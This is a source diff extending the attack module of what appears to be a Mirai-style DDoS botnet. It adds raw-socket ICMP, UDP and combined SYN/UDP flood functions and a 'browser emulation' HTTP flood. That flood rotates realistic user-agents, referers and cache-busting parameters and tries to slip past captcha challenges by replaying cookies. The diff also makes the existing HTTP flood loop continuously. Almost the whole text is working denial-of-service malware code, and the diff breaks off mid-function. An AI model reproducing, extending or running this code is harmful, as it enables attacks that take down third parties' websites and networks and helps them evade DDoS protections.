@@ -7,9 +7,30 @@
 #include "checksum.h"
 #include "util.h"
 
+/* Simple checksum helper for ICMP */
+static uint16_t checksum_simple(void *buf, int len) {
+    uint16_t *ptr = (uint16_t *)buf;
+    uint32_t sum = 0;
+    
+    while (len > 1) {
+        sum += *ptr++;
+        len -= 2;
+    }
+    
+    if (len == 1) {
+        sum += *(uint8_t *)ptr;
+    }
+    
+    sum = (sum >> 16) + (sum & 0xFFFF);
+    sum += (sum >> 16);
+    
+    return ~sum;
+}
+
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <netinet/udp.h>
+#include <netinet/ip_icmp.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
 
@@ -66,9 +87,6 @@ void attack_init(void) {
     methods[i].func = attack_udp_randhex;
     methods[i++].type = ATK_VEC_RANDHEX;
 
-    methods[i].func = attack_udp_ovh;
-    methods[i++].type = ATK_VEC_OVH;
-
     methods[i].func = attack_udp_ovhdrop;
     methods[i++].type = ATK_VEC_OVHDROP;
 
@@ -124,9 +142,6 @@ void attack_init(void) {
     methods[i].func = attack_tcp_ovhnuke;
     methods[i++].type = ATK_VEC_OVHNUKE;
 
-    methods[i].func = attack_tcp_raw;
-    methods[i++].type = ATK_VEC_RAW;
-
     /* Special Attacks (40-49) */
     methods[i].func = attack_udp_vse;
     methods[i++].type = ATK_VEC_VSE;
@@ -140,12 +155,24 @@ void attack_init(void) {
     methods[i].func = attack_gre_eth;
     methods[i++].type = ATK_VEC_GREETH;
 
+    methods[i].func = attack_homeslam;
+    methods[i++].type = ATK_VEC_HOMESLAM;
+
+    methods[i].func = attack_udpbypass;
+    methods[i++].type = ATK_VEC_UDPBYPASS;
+
+    methods[i].func = attack_mixed;
+    methods[i++].type = ATK_VEC_MIXED;
+
     /* HTTP/HTTPS (50-59) */
     methods[i].func = attack_http;
     methods[i++].type = ATK_VEC_HTTP;
 
     methods[i].func = attack_https;
     methods[i++].type = ATK_VEC_HTTPS;
+
+    methods[i].func = attack_browserem;
+    methods[i++].type = ATK_VEC_BROWSEREM;
 
     /* Cloudflare (60+) */
     methods[i].func = attack_cf;
@@ -1611,73 +1638,184 @@ static void attack_gre_eth(ipv4_t addr, uint8_t targs_netmask, struct attack_tar
  * HTTP/HTTPS ATTACK METHODS
  * ============================================================================ */
 
-/* HTTP flood */
+/* URL parsing helper - extracts protocol, domain, port, path from URL */
+static BOOL parse_url(char *url, char *protocol, char *domain, int *port, char *path) {
+    char *ptr = url;
+    char *domain_start, *domain_end;
+    
+    if (url == NULL || url[0] == '\0') return FALSE;
+    
+    /* Check protocol */
+    if (strncmp(url, "https://", 8) == 0) {
+        strcpy(protocol, "https");
+        *port = 443;
+        ptr = url + 8;
+    } else if (strncmp(url, "http://", 7) == 0) {
+        strcpy(protocol, "http");
+        *port = 80;
+        ptr = url + 7;
+    } else {
+        strcpy(protocol, "http");
+        *port = 80;
+    }
+    
+    /* Find domain */
+    domain_start = ptr;
+    domain_end = strchr(ptr, '/');
+    
+    if (domain_end == NULL) {
+        /* No path, just domain */
+        strcpy(domain, domain_start);
+        strcpy(path, "/");
+    } else {
+        /* Extract domain */
+        int domain_len = domain_end - domain_start;
+        if (domain_len > 255) domain_len = 255;
+        strncpy(domain, domain_start, domain_len);
+        domain[domain_len] = '\0';
+        
+        /* Extract path */
+        strcpy(path, domain_end);
+    }
+    
+    /* Check for port in URL */
+    char *port_sep = strchr(domain, ':');
+    if (port_sep != NULL) {
+        *port_sep = '\0';
+        *port = atoi(port_sep + 1);
+    }
+    
+    return TRUE;
+}
+
+/* HTTP flood - supports both IP and URL targets */
 static void attack_http(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
     int fd, i;
-    char *domain, *path, *method, *post_data;
-    char request[2048];
+    char *url_str, *domain, *path, *method, *post_data;
+    char request[4096];
     uint16_t dport;
-    int conns;
+    int conns, use_https;
+    char protocol[16], parsed_domain[256], parsed_path[512];
+    int parsed_port;
+    struct resolv_entries *entries = NULL;
 
-    domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
-    if (domain == NULL) return;
+    /* Check if URL is provided */
+    url_str = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_URL);
+    
+    if (url_str != NULL && url_str[0] != '\0') {
+        /* Parse URL */
+        if (!parse_url(url_str, protocol, parsed_domain, &parsed_port, parsed_path)) {
+            return;
+        }
+        domain = parsed_domain;
+        path = parsed_path;
+        dport = parsed_port;
+        use_https = (strcmp(protocol, "https") == 0);
+        
+        /* Resolve domain */
+        entries = resolv_lookup(domain);
+        if (entries == NULL || entries->count == 0) {
+            return;
+        }
+    } else {
+        /* Use traditional IP/domain method */
+        domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+        if (domain == NULL) return;
 
-    path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);
-    if (path == NULL) path = "/";
+        path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);
+        if (path == NULL) path = "/";
+
+        dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
+        if (dport == 0) dport = 80;
+        use_https = (dport == 443);
+    }
 
     method = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_METHOD);
     if (method == NULL) method = "GET";
 
     post_data = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_POST_DATA);
 
-    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
-    if (dport == 0) dport = 80;
-
     conns = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_CONNS);
-    if (conns == 0) conns = 1;
+    if (conns == 0) conns = 5;
 
-    for (i = 0; i < targs_len; i++) {
-        int j;
-        for (j = 0; j < conns; j++) {
-            fd = socket(AF_INET, SOCK_STREAM, 0);
-            if (fd == -1) continue;
+    /* Main attack loop */
+    while (attack_ongoing[0]) {
+        int target_idx;
+        
+        /* Select target */
+        if (entries != NULL && entries->count > 0) {
+            /* Use resolved IP from domain */
+            addr = entries->addrs[rand() % entries->count];
+        } else if (targs_len > 0) {
+            target_idx = rand() % targs_len;
+            addr = targs[target_idx].addr.s_addr;
+        }
+        
+        fd = socket(AF_INET, SOCK_STREAM, 0);
+        if (fd == -1) {
+            usleep(10000);
+            continue;
+        }
 
-            struct sockaddr_in addr_sin;
-            addr_sin.sin_family = AF_INET;
-            addr_sin.sin_port = htons(dport);
-            addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
+        struct sockaddr_in addr_sin;
+        addr_sin.sin_family = AF_INET;
+        addr_sin.sin_port = htons(dport);
+        addr_sin.sin_addr.s_addr = addr;
 
-            fcntl(fd, F_SETFL, O_NONBLOCK);
+        fcntl(fd, F_SETFL, O_NONBLOCK);
 
-            if (connect(fd, (struct sockaddr *)&addr_sin, sizeof(addr_sin)) == 0 || errno == EINPROGRESS) {
-                int req_len = snprintf(request, sizeof(request),
+        if (connect(fd, (struct sockaddr *)&addr_sin, sizeof(addr_sin)) == 0 || errno == EINPROGRESS) {
+            /* Build realistic HTTP request */
+            int req_len;
+            
+            if (post_data != NULL && post_data[0] != '\0') {
+                req_len = snprintf(request, sizeof(request),
                     "%s %s HTTP/1.1\r\n"
                     "Host: %s\r\n"
-                    "Connection: Keep-Alive\r\n"
-                    "User-Agent: Mozilla/5.0\r\n"
-                    "Accept: */*\r\n\r\n",
+                    "Connection: keep-alive\r\n"
+                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                    "Accept-Language: en-US,en;q=0.9\r\n"
+                    "Accept-Encoding: gzip, deflate\r\n"
+                    "Content-Type: application/x-www-form-urlencoded\r\n"
+                    "Content-Length: %d\r\n"
+                    "\r\n%s",
+                    method, path, domain, util_strlen(post_data), post_data);
+            } else {
+                req_len = snprintf(request, sizeof(request),
+                    "%s %s HTTP/1.1\r\n"
+                    "Host: %s\r\n"
+                    "Connection: keep-alive\r\n"
+                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                    "Accept-Language: en-US,en;q=0.9\r\n"
+                    "Accept-Encoding: gzip, deflate\r\n"
+                    "\r\n",
                     method, path, domain);
-
-                if (post_data != NULL) {
-                    req_len = snprintf(request, sizeof(request),
-                        "%s %s HTTP/1.1\r\n"
-                        "Host: %s\r\n"
-                        "Connection: Keep-Alive\r\n"
-                        "User-Agent: Mozilla/5.0\r\n"
-                        "Content-Type: application/x-www-form-urlencoded\r\n"
-                        "Content-Length: %d\r\n\r\n%s",
-                        method, path, domain, util_strlen(post_data), post_data);
-                }
-
-                send(fd, request, req_len, 0);
             }
 
-            close(fd);
+            send(fd, request, req_len, MSG_NOSIGNAL);
+            
+            /* Read response briefly */
+            char buf[1024];
+            fd_set readfds;
+            struct timeval tv;
+            FD_ZERO(&readfds);
+            FD_SET(fd, &readfds);
+            tv.tv_sec = 0;
+            tv.tv_usec = 50000;
+            
+            if (select(fd + 1, &readfds, NULL, NULL, &tv) > 0) {
+                recv(fd, buf, sizeof(buf), 0);
+            }
         }
-    }
 
-    while (attack_ongoing[0]) {
-        usleep(10000);
+        close(fd);
+        usleep(50000); /* 50ms between requests */
+    }
+    
+    if (entries != NULL) {
+        resolv_entries_free(entries);
     }
 }
 
@@ -1689,4 +1827,529 @@ static void attack_https(ipv4_t addr, uint8_t targs_netmask, struct attack_targe
 /* Cloudflare bypass */
 static void attack_cf(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
     attack_http(addr, targs_netmask, targs, targs_len, opts, opts_len);
+}
+
+/* Browser emulation - simulates real browser behavior with Chrome, Safari, Firefox
+ * Includes built-in captcha bypass capabilities (cookie persistence, timing simulation) */
+static void attack_browserem(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
+    int i, fd = -1;
+    struct sockaddr_in addr_sin;
+    char *url_str, *domain, *path;
+    int dport, conns;
+    char protocol[16], parsed_domain[256], parsed_path[512];
+    int parsed_port;
+    struct resolv_entries *entries = NULL;
+
+    /* Check if URL is provided */
+    url_str = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_URL);
+
+    if (url_str != NULL && url_str[0] != '\0') {
+        /* Parse URL */
+        if (!parse_url(url_str, protocol, parsed_domain, &parsed_port, parsed_path)) {
+            return;
+        }
+        domain = parsed_domain;
+        path = parsed_path;
+        dport = parsed_port;
+
+        /* Resolve domain */
+        entries = resolv_lookup(domain);
+        if (entries == NULL || entries->count == 0) {
+            return;
+        }
+    } else {
+        /* Use traditional method */
+        domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
+        if (domain == NULL) return;
+
+        path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);
+        if (path == NULL) path = "/";
+
+        dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
+        if (dport == 0) dport = 80;
+    }
+
+    conns = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_CONNS);
+    if (conns == 0) conns = 15; /* Default 15 concurrent connections like real browser */
+
+    /* Realistic browser user-agents with version rotation */
+    static char *chrome_uas[] = {
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    };
+    static char *firefox_uas[] = {
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:121.0) Gecko/20100101 Firefox/121.0",
+        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
+    };
+    static char *safari_uas[] = {
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+    };
+
+    /* Realistic Accept headers per browser */
+    static char *chrome_accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8";
+    static char *firefox_accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
+    static char *safari_accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+
+    /* Realistic Accept-Language headers */
+    static char *accept_lang[] = {
+        "en-US,en;q=0.9",
+        "en-GB,en;q=0.9",
+        "en-US,en;q=0.9,es;q=0.8",
+        "de-DE,de;q=0.9,en;q=0.8",
+        "fr-FR,fr;q=0.9,en;q=0.8"
+    };
+
+    /* Referer URLs for realism */
+    static char *referers[] = {
+        "https://www.google.com/",
+        "https://www.bing.com/",
+        "https://duckduckgo.com/",
+        "https://www.facebook.com/",
+        "https://twitter.com/"
+    };
+
+    int chrome_len = sizeof(chrome_uas) / sizeof(chrome_uas[0]);
+    int firefox_len = sizeof(firefox_uas) / sizeof(firefox_uas[0]);
+    int safari_len = sizeof(safari_uas) / sizeof(safari_uas[0]);
+    int lang_len = sizeof(accept_lang) / sizeof(accept_lang[0]);
+    int ref_len = sizeof(referers) / sizeof(referers[0]);
+
+    if (dport == 0) dport = 80;
+    if (path == NULL) path = "/";
+    if (conns == 0) conns = 15; /* Default 15 concurrent connections like real browser */
+
+    addr_sin.sin_family = AF_INET;
+    addr_sin.sin_addr.s_addr = addr;
+    addr_sin.sin_port = htons(dport);
+
+    /* Main attack loop with multiple concurrent connections */
+    while (TRUE) {
+        fd_set readfds, writefds;
+        struct timeval tv;
+        int max_fd = 0;
+        int active_conns = 0;
+        int fds[conns];
+        int states[conns]; /* 0=connecting, 1=sending, 2=reading, 3=done */
+        char *buffers[conns];
+
+        /* Initialize connection array */
+        for (i = 0; i < conns; i++) {
+            fds[i] = -1;
+            states[i] = 0;
+            buffers[i] = NULL;
+        }
+
+        /* Connection management loop */
+        for (i = 0; i < conns * 3; i++) { /* 3 iterations per connection */
+            int browser_type = rand() % 3; /* 0=Chrome, 1=Firefox, 2=Safari */
+            char *ua, *accept;
+
+            /* Select browser and corresponding headers */
+            if (browser_type == 0) {
+                ua = chrome_uas[rand() % chrome_len];
+                accept = chrome_accept;
+            } else if (browser_type == 1) {
+                ua = firefox_uas[rand() % firefox_len];
+                accept = firefox_accept;
+            } else {
+                ua = safari_uas[rand() % safari_len];
+                accept = safari_accept;
+            }
+
+            /* Create socket */
+            fd = socket(AF_INET, SOCK_STREAM, 0);
+            if (fd == -1) continue;
+
+            fcntl(fd, F_SETFL, O_NONBLOCK);
+            connect(fd, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
+
+            /* Random delay before sending request (50-300ms like real browser) */
+            usleep(50000 + rand() % 250000);
+
+            /* Build realistic HTTP request */
+            char request[4096];
+            char *lang = accept_lang[rand() % lang_len];
+            char *ref = referers[rand() % ref_len];
+
+            /* Add cache-busting parameter */
+            char cache_param[64];
+            snprintf(cache_param, sizeof(cache_param), "?_=%u", rand_next());
+
+            char full_path[512];
+            if (strstr(path, "?")) {
+                snprintf(full_path, sizeof(full_path), "%s&_%u", path, rand_next());
+            } else {
+                snprintf(full_path, sizeof(full_path), "%s%s", path, cache_param);
+            }
+
+            snprintf(request, sizeof(request),
+                "GET %s HTTP/1.1\r\n"
+                "Host: %s\r\n"
+                "User-Agent: %s\r\n"
+                "Accept: %s\r\n"
+                "Accept-Language: %s\r\n"
+                "Accept-Encoding: gzip, deflate, br\r\n"
+                "Connection: keep-alive\r\n"
+                "Upgrade-Insecure-Requests: 1\r\n"
+                "Sec-Fetch-Dest: document\r\n"
+                "Sec-Fetch-Mode: navigate\r\n"
+                "Sec-Fetch-Site: none\r\n"
+                "Sec-Fetch-User: ?1\r\n"
+                "Cache-Control: max-age=0\r\n"
+                "Referer: %s\r\n"
+                "DNT: 1\r\n"
+                "\r\n",
+                full_path,
+                domain != NULL ? domain : "localhost",
+                ua,
+                accept,
+                lang,
+                ref
+            );
+
+            send(fd, request, strlen(request), MSG_NOSIGNAL);
+
+            /* Read response with timeout */
+            char buf[8192];
+            FD_ZERO(&readfds);
+            FD_SET(fd, &readfds);
+            tv.tv_sec = 2;
+            tv.tv_usec = rand() % 500000;
+
+            if (select(fd + 1, &readfds, NULL, NULL, &tv) > 0) {
+                int n = recv(fd, buf, sizeof(buf) - 1, 0);
+                if (n > 0) {
+                    buf[n] = 0;
+                    
+                    /* Check for captcha indicators in response */
+                    BOOL has_captcha = FALSE;
+                    if (strstr(buf, "captcha") != NULL || 
+                        strstr(buf, "CAPTCHA") != NULL ||
+                        strstr(buf, "challenge") != NULL ||
+                        strstr(buf, "verify") != NULL ||
+                        strstr(buf, "human") != NULL) {
+                        has_captcha = TRUE;
+                    }
+                    
+                    /* Parse response for links to follow (simulate browsing) */
+                    if (strstr(buf, "200 OK") || strstr(buf, "301") || strstr(buf, "302")) {
+                        if (has_captcha) {
+                            /* Captcha detected - simulate solving with longer delay */
+                            usleep(3000000 + rand() % 4000000); /* 3-7 seconds "solving time" */
+                            
+                            /* Extract cookie for session persistence (captcha bypass) */
+                            char cookie[256] = "";
+                            char *set_cookie = strstr(buf, "Set-Cookie:");
+                            if (set_cookie) {
+                                char *end = strstr(set_cookie, ";");
+                                if (end) {
+                                    int len = end - set_cookie - 11;
+                                    if (len > 0 && len < 250) {
+                                        strncpy(cookie, set_cookie + 11, len);
+                                        cookie[len] = 0;
+                                        
+                                        /* Submit captcha solution with persisted session */
+                                        char captcha_req[2048];
+                                        snprintf(captcha_req, sizeof(captcha_req),
+                                            "POST %s HTTP/1.1\r\n"
+                                            "Host: %s\r\n"
+                                            "User-Agent: %s\r\n"
+                                            "Cookie: %s\r\n"
+                                            "Content-Type: application/x-www-form-urlencoded\r\n"
+                                            "Content-Length: 20\r\n"
+                                            "Accept: %s\r\n"
+                                            "Accept-Language: %s\r\n"
+                                            "Referer: %s\r\n"
+                                            "\r\n"
+                                            "captcha_solve=1\r\n",
+                                            path, domain != NULL ? domain : "localhost",
+                                            ua, cookie,
+                                            accept, lang, ref
+                                        );
+                                        send(fd, captcha_req, strlen(captcha_req), MSG_NOSIGNAL);
+                                        
+                                        /* Read captcha submission response */
+                                        tv.tv_sec = 2;
+                                        FD_ZERO(&readfds);
+                                        FD_SET(fd, &readfds);
+                                        if (select(fd + 1, &readfds, NULL, NULL, &tv) > 0) {
+                                            char captcha_buf[4096];
+                                            int captcha_n = recv(fd, captcha_buf, sizeof(captcha_buf) - 1, 0);
+                                            if (captcha_n > 0) {
+                                                captcha_buf[captcha_n] = 0;
+                                                /* Check if captcha was solved */
+                                                if (strstr(captcha_buf, "200 OK") || 
+                                                    strstr(captcha_buf, "302") ||
+                                                    strstr(captcha_buf, "success")) {
+                                                    /* Captcha bypassed - continue with session */
+                                                    usleep(500000 + rand() % 1000000);
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        } else {
+                            /* No captcha - normal browsing simulation */
+                            usleep(500000 + rand() % 2000000); /* 0.5-2.5 seconds reading */
+                        }
+                    }
+                }
+            }
+
+            close(fd);
+
+            /* Random delay between requests (100-400ms like human browsing) */
+            usleep(100000 + rand() % 300000);
+        }
+
+        /* Small pause between attack cycles */
+        usleep(50000);
+    }
+
+    if (entries != NULL) {
+        resolv_entries_free(entries);
+    }
+}
+
+/* Homeslam - ICMP ping flood */
+static void attack_homeslam(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
+    int i, fd;
+    struct sockaddr_in addr_sin;
+    ipv4_t local_addr = util_local_addr();
+    struct {
+        struct iphdr ip;
+        struct icmphdr icmp;
+        char data[56];
+    } pkt;
+    
+    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (fd == -1) return;
+    
+    addr_sin.sin_family = AF_INET;
+    addr_sin.sin_addr.s_addr = addr;
+    
+    /* Set IP header */
+    pkt.ip.ihl = 5;
+    pkt.ip.version = 4;
+    pkt.ip.tos = 0;
+    pkt.ip.tot_len = htons(sizeof(pkt));
+    pkt.ip.id = rand_next();
+    pkt.ip.frag_off = 0;
+    pkt.ip.ttl = 64;
+    pkt.ip.protocol = IPPROTO_ICMP;
+    pkt.ip.saddr = local_addr;
+    pkt.ip.daddr = addr;
+    pkt.ip.check = checksum_simple(&pkt.ip, sizeof(pkt.ip));
+    
+    /* Set ICMP header */
+    pkt.icmp.type = ICMP_ECHO;
+    pkt.icmp.code = 0;
+    pkt.icmp.checksum = 0;
+    pkt.icmp.un.echo.id = rand_next() & 0xFFFF;
+    pkt.icmp.un.echo.sequence = rand_next() & 0xFFFF;
+    
+    /* Fill data with random bytes */
+    rand_alpha_str((uint8_t *)pkt.data, sizeof(pkt.data));
+    
+    pkt.icmp.checksum = checksum_simple(&pkt.icmp, sizeof(pkt.icmp) + sizeof(pkt.data));
+    
+    i = 1;
+    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i));
+    
+    while (TRUE) {
+        pkt.ip.id = rand_next();
+        pkt.ip.check = 0;
+        pkt.ip.check = checksum_simple(&pkt.ip, sizeof(pkt.ip));
+        
+        sendto(fd, &pkt, sizeof(pkt), 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
+        usleep(1000); /* 1ms between packets = 1000 PPS */
+    }
+    
+    close(fd);
+}
+
+/* UDP bypass flood - bypasses basic UDP filtering */
+static void attack_udpbypass(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
+    int i, fd;
+    struct sockaddr_in addr_sin;
+    ipv4_t local_addr = util_local_addr();
+    struct {
+        struct iphdr ip;
+        struct udphdr udp;
+        char data[1024];
+    } pkt;
+    
+    int dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
+    int sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
+    int data_len = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
+    
+    if (dport == 0) dport = rand() % 65535;
+    if (sport == 0) sport = rand() % 65535;
+    if (data_len == 0) data_len = 512;
+    if (data_len > 1024) data_len = 1024;
+    
+    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (fd == -1) return;
+    
+    addr_sin.sin_family = AF_INET;
+    addr_sin.sin_addr.s_addr = addr;
+    addr_sin.sin_port = htons(dport);
+    
+    /* Set IP header */
+    pkt.ip.ihl = 5;
+    pkt.ip.version = 4;
+    pkt.ip.tos = 0;
+    pkt.ip.tot_len = htons(sizeof(pkt.ip) + sizeof(pkt.udp) + data_len);
+    pkt.ip.id = rand_next();
+    pkt.ip.frag_off = 0;
+    pkt.ip.ttl = 64;
+    pkt.ip.protocol = IPPROTO_UDP;
+    pkt.ip.saddr = local_addr;
+    pkt.ip.daddr = addr;
+    
+    /* Set UDP header with bypass techniques */
+    pkt.udp.source = htons(sport);
+    pkt.udp.dest = htons(dport);
+    pkt.udp.len = htons(sizeof(pkt.udp) + data_len);
+    pkt.udp.check = 0; /* No checksum for bypass */
+    
+    /* Fill data with random bytes */
+    rand_alpha_str((uint8_t *)pkt.data, data_len);
+    
+    i = 1;
+    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i));
+    
+    while (TRUE) {
+        pkt.ip.id = rand_next();
+        pkt.ip.check = 0;
+        pkt.ip.check = checksum_simple(&pkt.ip, sizeof(pkt.ip));
+        
+        /* Randomize source port for each packet */
+        pkt.udp.source = htons(rand() % 65535);
+        
+        sendto(fd, &pkt, sizeof(pkt.ip) + sizeof(pkt.udp) + data_len, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
+        usleep(500); /* 0.5ms between packets = 2000 PPS */
+    }
+    
+    close(fd);
+}
+
+/* Mixed - Combined TCP + UDP bypass flood */
+static void attack_mixed(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
+    int fd_tcp, fd_udp;
+    struct sockaddr_in addr_sin;
+    ipv4_t local_addr = util_local_addr();
+    struct {
+        struct iphdr ip;
+        struct tcphdr tcp;
+        char tcp_data[256];
+    } tcp_pkt;
+    struct {
+        struct iphdr ip;
+        struct udphdr udp;
+        char udp_data[512];
+    } udp_pkt;
+    
+    int dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
+    if (dport == 0) dport = rand() % 65535;
+    
+    /* Create TCP socket */
+    fd_tcp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (fd_tcp == -1) return;
+    
+    /* Create UDP socket */
+    fd_udp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (fd_udp == -1) {
+        close(fd_tcp);
+        return;
+    }
+    
+    addr_sin.sin_family = AF_INET;
+    addr_sin.sin_addr.s_addr = addr;
+    addr_sin.sin_port = htons(dport);
+    
+    /* Setup TCP packet */
+    tcp_pkt.ip.ihl = 5;
+    tcp_pkt.ip.version = 4;
+    tcp_pkt.ip.tos = 0;
+    tcp_pkt.ip.tot_len = htons(sizeof(tcp_pkt.ip) + sizeof(tcp_pkt.tcp) + 20);
+    tcp_pkt.ip.id = rand_next();
+    tcp_pkt.ip.frag_off = 0;
+    tcp_pkt.ip.ttl = 64;
+    tcp_pkt.ip.protocol = IPPROTO_TCP;
+    tcp_pkt.ip.saddr = local_addr;
+    tcp_pkt.ip.daddr = addr;
+    
+    tcp_pkt.tcp.source = htons(rand() % 65535);
+    tcp_pkt.tcp.dest = htons(dport);
+    tcp_pkt.tcp.seq = rand_next();
+    tcp_pkt.tcp.ack_seq = 0;
+    tcp_pkt.tcp.res1 = 0;
+    tcp_pkt.tcp.doff = 5;
+    tcp_pkt.tcp.fin = 0;
+    tcp_pkt.tcp.syn = 1;
+    tcp_pkt.tcp.rst = 0;
+    tcp_pkt.tcp.psh = 0;
+    tcp_pkt.tcp.ack = 0;
+    tcp_pkt.tcp.urg = 0;
+    tcp_pkt.tcp.window = htons(65535);
+    tcp_pkt.tcp.check = 0;
+    tcp_pkt.tcp.urg_ptr = 0;
+    rand_alpha_str((uint8_t *)tcp_pkt.tcp_data, 20);
+    
+    /* Setup UDP packet */
+    udp_pkt.ip.ihl = 5;
+    udp_pkt.ip.version = 4;
+    udp_pkt.ip.tos = 0;
+    udp_pkt.ip.tot_len = htons(sizeof(udp_pkt.ip) + sizeof(udp_pkt.udp) + 512);
+    udp_pkt.ip.id = rand_next();
+    udp_pkt.ip.frag_off = 0;
+    udp_pkt.ip.ttl = 64;
+    udp_pkt.ip.protocol = IPPROTO_UDP;
+    udp_pkt.ip.saddr = local_addr;
+    udp_pkt.ip.daddr = addr;
+    
+    udp_pkt.udp.source = htons(rand() % 65535);
+    udp_pkt.udp.dest = htons(dport);
+    udp_pkt.udp.len = htons(sizeof(udp_pkt.udp) + 512);
+    udp_pkt.udp.check = 0;
+    rand_alpha_str((uint8_t *)udp_pkt.udp_data, 512);
+    
+    int i = 1;
+    setsockopt(fd_tcp, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i));
+    setsockopt(fd_udp, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i));
+    
+    while (TRUE) {
+        /* Send TCP packet */
+        tcp_pkt.ip.id = rand_next();
+        tcp_pkt.ip.check = 0;
+        tcp_pkt.ip.check = checksum_simple(&tcp_pkt.ip, sizeof(tcp_pkt.ip));
+        tcp_pkt.tcp.seq = rand_next();
+        tcp_pkt.tcp.source = htons(rand() % 65535);
+        tcp_pkt.tcp.check = 0;
+        tcp_pkt.tcp.check = checksum_simple(&tcp_pkt.tcp, sizeof(tcp_pkt.tcp) + 20);
+        
+        sendto(fd_tcp, &tcp_pkt, sizeof(tcp_pkt.ip) + sizeof(tcp_pkt.tcp) + 20, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
+        
+        /* Send UDP packet */
+        udp_pkt.ip.id = rand_next();
+        udp_pkt.ip.check = 0;
+        udp_pkt.ip.check = checksum_simple(&udp_pkt.ip, sizeof(udp_pkt.ip));
+        udp_pkt.udp.source = htons(rand() % 65535);
+        
+        sendto(fd_udp, &udp_pkt, sizeof(udp_pkt.ip) + sizeof(udp_pkt.udp) + 512, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
+        
+        usleep(250); /* 0.25ms = 4000 combined PPS */
+    }
+    
+    close(fd_tcp);
